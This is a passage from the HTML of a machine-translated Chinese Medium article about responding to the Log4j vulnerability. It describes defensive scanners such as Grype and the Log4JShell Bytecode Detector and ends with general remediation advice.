data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*pYGsZVURQ2Ljxxs4f03cXA.jpeg"/></div></div><p class="le lf gk gi gj lg lh bd b be z dk translated"><a class="ae li" href="https://twitter.com/joshbressers/status/1469411411948417035" rel="noopener ugc nofollow" target="_blank">来源</a></p></figure><h2 id="ea92" class="mz na iu bd ni oo op dn nm oq or dp nq ls os ot ns lw ou ov nu ma ow ox nw ja bi translated">格里佩</h2><p id="a5eb" class="pw-post-body-paragraph lj lk iu ll b lm ny ke lo lp nz kh lr ls oa lu lv lw ob ly lz ma oc mc md me in bi translated"><a class="ae li" href="https://github.com/anchore/grype" rel="noopener ugc nofollow" target="_blank"> Grype </a>是一个漏洞扫描器。它能够扫描多层嵌套，并告知特定软件中的漏洞列表，并识别依赖关系包含的漏洞。</p><figure class="kt ku kv kw gu kx gi gj paragraph-image"><div role="button" tabindex="0" class="ky kz di la bf lb"><div class="gi gj ql"><img src="../Images/66565d525de763933a2e674b39b8dade.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*bbsV0AzZ_UiLlWj2oYaBwQ.png"/></div></div><p class="le lf gk gi gj lg lh bd b be z dk translated">使用Grype ( <a class="ae li" href="https://anchore.com/opensource/" rel="noopener ugc nofollow" target="_blank"> source </a>)扫描漏洞</p></figure><p id="47f2" class="pw-post-body-paragraph lj lk iu ll b lm ln ke lo lp lq kh lr ls lt lu lv lw lx ly lz ma mb mc md me in bi translated">这些工具允许您扫描:</p><ul class=""><li id="548c" class="pw px iu ll b lm ln lp lq ls py lw pz ma qa me qb qc qd qe bi translated">磁盘上的目录，</li><li id="9904" class="pw px iu ll b lm qf lp qg ls qh lw qi ma qj me qb qc qd qe bi translated">本地容器图像，</li><li id="78fa" class="pw px iu ll b lm qf lp qg ls qh lw qi ma qj me qb qc qd qe bi translated">远程注册表中的容器，</li></ul><p id="695d" class="pw-post-body-paragraph lj lk iu ll b lm ln ke lo lp lq kh lr ls lt lu lv lw lx ly lz ma mb mc md me in bi translated">您可以在构建之前检查您的代码库，或者在构建之后检查最终的应用程序。</p><h2 id="6d45" class="mz na iu bd ni oo op dn nm oq or dp nq ls os ot ns lw ou ov nu ma ow ox nw ja bi translated">Log4JShell字节码检测器</h2><p id="b9c1" class="pw-post-body-paragraph lj lk iu ll b lm ny ke lo lp nz kh lr ls oa lu lv lw ob ly lz ma oc mc md me in bi translated">要检查您的基础设施中的Log4j缺陷，您还可以使用<a class="ae li" href="https://github.com/CodeShield-Security/Log4JShell-Bytecode-Detector" rel="noopener ugc nofollow" target="_blank"> Log4JShell字节码检测器</a>，您可以在GitHub的CodeShield存储库中找到它。</p><p id="7ea1" class="pw-post-body-paragraph lj lk iu ll b lm ln ke lo lp lq kh lr ls lt lu lv lw lx ly lz ma mb mc md me in bi translated">这种工具可以提供支持，但它不能在所有情况下提供100%的检测。</p></div><div class="ab cl qm qn hy qo" role="separator"><span class="qp bw bk qq qr qs"/><span class="qp bw bk qq qr qs"/><span class="qp bw bk qq qr"/></div><div class="in io ip iq ir"><h1 id="494e" class="nh na iu bd ni nj qt nl nm nn qu np nq kj qv kk ns km qw kn nu kp qx kq nw nx bi translated">最终想法</h1><p id="62bb" class="pw-post-body-paragraph lj lk iu ll b lm ny ke lo lp nz kh lr ls oa lu lv lw ob ly lz ma oc mc md me in bi translated">虽然世界各地的公司和服务提供商都在继续检查他们的产品，并且正在运行大量的安全更新，但对您来说，第一步也是最重要的一步是确保log4j漏洞是否会影响您，然后采取正确的措施。</p><p id="9fe0" class="pw-post-body-paragraph lj lk iu ll b lm ln ke lo lp lq kh lr ls lt lu lv lw lx ly lz ma mb mc md me in bi translated">如果你是一名程序员，在开发的每个阶段扫描你的应用程序也很重要，因为如果最初的源代码扫描是干净的，这并不意味着最终的构建或部署的应用程序将是干净的。</p><p id="54b0" class="pw-post-body-paragraph lj lk iu ll b lm ln ke lo lp lq kh lr ls lt lu lv lw lx ly lz ma mb mc md me in bi translated">预计log4j安全缺陷及其影响将影响web开发和依赖生态系统的未来。所以请继续关注，并且永远记住，代码越少越好。</p><p id="8eaf" class="pw-post-body-paragraph lj lk iu ll b lm ln ke lo lp lq kh lr ls lt lu lv lw lx ly lz ma mb mc md me in bi translated">你可以在Apache Log4j项目的网站<a class="ae li" href="https://logging.apache.org/log4j/2.x/security.html" rel="noopener ugc nofollow" target="_blank">上看到更多关于更新和缓解的信息。</a></p><pre class="kt ku kv kw gu mu mv mw mx aw my bi"><span id="4a15" class="mz na iu mv b gz nb nc l nd ne"><strong class="mv je">Want to Connect With the Author?</strong></span><span id="ace2" class="mz na iu mv b gz nf nc l nd ne">I write about engineering, technology, and leadership for a community of smart, curious people. <a class="ae li" href="https://rakiabensassi.substack.com/" rel="noopener ugc nofollow" target="_blank">Join my free email newsletter for exclusive access</a>.</span></pre></div></div>    
</body>
</html>